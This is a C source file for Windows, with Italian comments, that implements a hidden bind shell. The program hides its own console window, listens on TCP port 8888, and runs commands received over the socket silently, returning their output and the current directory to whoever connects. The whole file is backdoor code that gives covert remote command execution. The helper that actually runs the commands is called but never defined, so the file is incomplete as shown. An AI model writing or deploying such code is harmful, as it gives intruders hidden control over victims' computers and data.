#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>


#pragma comment(lib, "Ws2_32.lib")
#define MAX_PATH 1024

int main() 
{
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);  // Nasconde la finestra della console

    WSADATA 
        wsaData;
    SOCKET 
        serverSocket,
        clientSocket;
    struct sockaddr_in 
        server,
        client;
    char 
        recvbuf[512],
        cwd[1024],
        cmdOutput[1024];

    int 
        result,
        clientLen = sizeof(client);

    // inizializza Winsock
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        printf("Errore WSAStartup\n");
        return 1;
    }

    // crea il socket
    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        printf("Errore socket: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    // imposta indirizzo server
    server.sin_family = AF_INET;
    server.sin_port = htons(8888);
    server.sin_addr.s_addr = INADDR_ANY;

    // bind
    if (bind(serverSocket, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("Errore bind: %d\n", WSAGetLastError());
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    // Listen
    listen(serverSocket, 1);

    // Accetta connessione
    clientSocket = accept(serverSocket, (struct sockaddr*)&client, &clientLen);
    if (clientSocket == INVALID_SOCKET) {
        printf("Errore accept\n");
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    while (1) {
        // Ricevi comando
        result = recv(clientSocket, recvbuf, sizeof(recvbuf) - 1, 0);
        if (result <= 0) break;
        recvbuf[result] = '\0';

        // Controlla se è un comando 'cd'
        if (strncmp(recvbuf, "cd ", 3) == 0) {
            // Prendi il path da spostare
            char *path = recvbuf + 3;
            // Rimuovi eventuali newline o spazi finali
            path[strcspn(path, "\r\n")] = 0;

            if (SetCurrentDirectoryA(path) == 0) {
                char *err = "Errore nel cambio directory\n";
                send(clientSocket, err, strlen(err), 0);
            }
        } else {
            if (execute_command_silently(recvbuf, cmdOutput, sizeof(cmdOutput)) == 0) {
                send(clientSocket, cmdOutput, strlen(cmdOutput), 0);
            } else {
                char *err = "Errore nell'esecuzione del comando\n";
                send(clientSocket, err, strlen(err), 0);
            }
        }

        // Manda il prompt con directory aggiornata
        GetCurrentDirectoryA(MAX_PATH, cwd);
        snprintf(cmdOutput, sizeof(cmdOutput), "\n%s> ", cwd);
        send(clientSocket, cmdOutput, strlen(cmdOutput), 0);
        send(clientSocket, "__END__", strlen("__END__"), 0);
    }

    closesocket(clientSocket);
    closesocket(serverSocket);
    WSACleanup();
    return 0;
}
